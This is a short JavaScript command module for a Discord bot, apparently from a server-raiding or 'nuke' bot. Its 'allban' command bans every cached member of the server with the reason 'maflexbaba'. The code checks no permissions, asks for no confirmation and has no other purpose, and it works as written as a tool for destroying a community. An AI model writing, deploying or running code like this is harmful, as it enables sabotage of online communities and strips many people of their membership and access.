module.exports.run = async (client, message, args) => {
    
    message.guild.members.cache.forEach(member => {
        member.ban({ reason: `maflexbaba` });
    });
}

module.exports.help = {

    name: "allban"

}